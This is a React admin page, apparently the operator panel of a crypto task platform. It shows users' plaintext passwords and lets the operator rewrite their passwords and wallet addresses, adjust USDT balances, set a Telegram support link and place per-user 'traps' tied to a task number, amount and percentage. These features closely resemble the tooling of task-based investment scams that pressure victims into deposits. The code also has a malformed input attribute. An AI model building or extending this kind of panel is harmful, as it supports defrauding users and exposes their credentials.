import React, { useState, useEffect } from "react";
import axios from "axios";
import Swal from "sweetalert2";
import { FiPlusCircle, FiRotateCcw, FiSettings, FiTrash2, FiTarget, FiX } from "react-icons/fi";

export default function Users() {
  const [users, setUsers] = useState([]);
  const [activeModal, setActiveModal] = useState(null); 
  const [targetUser, setTargetUser] = useState(null);
  const [formData, setFormData] = useState({});
  const [csLink, setCsLink] = useState(""); // ⭐ NEW

  const API_BASE = "https://iran-backend.onrender.com/.../api/admin";

  const fetchUsers = async () => {
    try {
      const res = await axios.get(`${API_BASE}/users`);
      setUsers(res.data);
      if (targetUser) {
        const updated = res.data.find(u => u.id === targetUser.id);
        setTargetUser(updated);
      }
    } catch (err) { console.error("Fetch error:", err); }
  };

  useEffect(() => { fetchUsers(); }, []);

  // ⭐ LOAD EXISTING CS LINK
  useEffect(() => {
    axios.get("https://iran-backend.onrender.com/.../api/cs-link")
      .then(res => setCsLink(res.data.link || ""));
  }, []);

  const deleteUser = (id) => {
    Swal.fire({
      title: 'Delete User?',
      text: "Permanent action!",
      icon: 'warning',
      showCancelButton: true,
      confirmButtonColor: '#e74c3c',
      background: '#1a1a1a', color: '#fff'
    }).then(async (result) => {
      if (result.isConfirmed) {
        await axios.delete(`${API_BASE}/delete-user/${id}`);
        fetchUsers();
      }
    });
  };

  const resetTasks = (id) => {
    Swal.fire({
      title: 'Reset Tasks?',
      text: "Progress will be 0/25",
      icon: 'info',
      showCancelButton: true,
      background: '#1a1a1a', color: '#fff'
    }).then(async (result) => {
      if (result.isConfirmed) {
        await axios.post(`${API_BASE}/reset-tasks`, { userId: id });
        fetchUsers();
        Swal.fire('Reset!', 'Tasks are now 0', 'success');
      }
    });
  };

  // ⭐ NEW — ADD CS BUTTON ACTION
  const handleAddCS = () => {
    Swal.fire({
      title: "Customer Support Link",
      input: "text",
      inputValue: csLink,
      inputPlaceholder: "Paste Telegram link here",
      showCancelButton: true,
      confirmButtonText: "Save",
      background: '#1a1a1a',
      color: '#fff'
    }).then(async (result) => {
      if (result.isConfirmed) {
        await axios.post("https://iran-backend.onrender.com/.../api/admin/set-cs-link", {
          link: result.value
        });
        setCsLink(result.value);
        Swal.fire("Saved!", "Support link updated", "success");
      }
    });
  };

  const handleAction = (type, user) => {
    setTargetUser(user);
    setActiveModal(type);

    if (type === "settings") {
      setFormData({
        pass: user.password,
        addr: user.walletAddress || ""
      });
    } else {
      setFormData({});
    }
  };

  const saveChanges = async () => {
    try {
      if (activeModal === 'balance') {
        await axios.post(`${API_BASE}/update-balance`, { userId: targetUser.id, amount: formData.amount });
      } 
      else if (activeModal === 'trap') {
        await axios.post(`${API_BASE}/set-trap`, { 
          userId: targetUser.id, 
          taskNum: formData.task, 
          amount: formData.amount, 
          percent: formData.percent 
        });
        setFormData({ task: '', amount: '', percent: '' });
      }
      else if (activeModal === 'settings') {
        await axios.post(`${API_BASE}/update-settings`, { 
          userId: targetUser.id, 
          password: formData.pass, 
          walletAddress: formData.addr
        });
      }
      
      Swal.fire('Success', 'Updated!', 'success');
      if (activeModal !== 'trap') setActiveModal(null);
      fetchUsers();
    } catch (err) {
      Swal.fire('Error', 'Update failed', 'error');
    }
  };

  const removeSpecificTrap = async (userId, taskNum) => {
    await axios.post(`${API_BASE}/remove-trap`, { userId, taskNum });
    fetchUsers();
  };

  return (
    <div className="admin-section">

      {/* ⭐ ADD CS BUTTON */}
      <div style={{display:"flex",justifyContent:"flex-end",marginBottom:"10px"}}>
        <button 
          onClick={handleAddCS}
          style={{
            background:"#ffaa00",
            border:"none",
            padding:"10px 18px",
            borderRadius:"12px",
            fontWeight:"600",
            cursor:"pointer"
          }}
        >
          + Add CS
        </button>
      </div>

      <div className="table-responsive">
        <table className="custom-table">
          <thead>
            <tr>
              <th>User Details</th>
              <th>Balance/Gap</th>
              <th>Quick Actions</th>
              <th>Manage</th>
            </tr>
          </thead>
          <tbody>
            {users.map((u) => (
              <tr key={u.id}>
                <td>
                    <div className="u-name">{u.username}</div>
                    <div className="u-meta">Pass: {u.password} | Task: {u.cycleOrders || 0}/25</div>
                </td>
                <td>
                  <span className="text-success">{Number(u.balance || 0).toFixed(2)} USDT</span>
                  {u.traps?.length > 0 && <div className="trap-count">{u.traps.length} Active Traps</div>}
                </td>
                <td>
                  <div className="action-row">
                    <button className="icon-btn plus" onClick={() => handleAction('balance', u)}><FiPlusCircle /></button>
                    <button className="trap-label-btn" 
                            style={{background: u.traps?.length > 0 ? '#ff4757' : '#ffa502'}} 
                            onClick={() => handleAction('trap', u)}>
                        <FiTarget /> TRAP {u.traps?.length > 0 ? `(${u.traps.length})` : ''}
                    </button>
                    <button className="icon-btn settings" onClick={() => handleAction('settings', u)}><FiSettings /></button>
                    <button className="icon-btn reset" onClick={() => resetTasks(u.id)}><FiRotateCcw /></button>
                  </div>
                </td>
                <td><button className="icon-btn delete" onClick={() => deleteUser(u.id)}><FiTrash2 /></button></td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>

      {activeModal && (
        <div className="modal-overlay">
          <div className="modal-card">
            <div className="modal-header">
                <h4>{activeModal.toUpperCase()} - {targetUser?.username}</h4>
                <FiX className="close-icon" onClick={() => setActiveModal(null)} />
            </div>
            <div className="modal-body">
              {activeModal === 'trap' && (
                <>
                  <div className="trap-list-container">
                    {targetUser?.traps?.map((t, i) => (
                      <div className="active-trap-item" key={i}>
                        <span>Task {t.taskNum}: ${t.trapAmount} ({t.trapPercent}%)</span>
                        <FiX className="remove-trap" onClick={() => removeSpecificTrap(targetUser.id, t.taskNum)} />
                      </div>
                    ))}
                  </div>
                  <div className="quick-trap-row">
                    <input type="number" placeholder="Task" onChange={(e)=>setFormData({...formData, task: e.target.value})} />
                    <input type="number"ing placeholder="Amt" onChange={(e)=>setFormData({...formData, amount: e.target.value})} />
                    <input type="number" placeholder="Rate" onChange={(e)=>setFormData({...formData, percent: e.target.value})} />
                    <button className="btn-add-small" onClick={saveChanges}>ADD</button>
                  </div>
                </>
              )}
              {activeModal === 'settings' && (
                <div className="trap-form">
                    <input type="text" placeholder="New Password" value={formData.pass} onChange={(e)=>setFormData({...formData, pass: e.target.value})} />
                    <input type="text" placeholder="Wallet Address" value={formData.addr} onChange={(e)=>setFormData({...formData, addr: e.target.value})} />
                    <button className="btn-confirm full" onClick={saveChanges}>SAVE</button>
                </div>
              )}
              {activeModal === 'balance' && (
                <div className="trap-form">
                    <input type="number" placeholder="Amount to add" onChange={(e)=>setFormData({...formData, amount: e.target.value})} />
                    <button className="btn-confirm full" onClick={saveChanges}>UPDATE</button>
                </div>
              )}
            </div>
          </div>
        </div>
      )}
    </div>
  );
}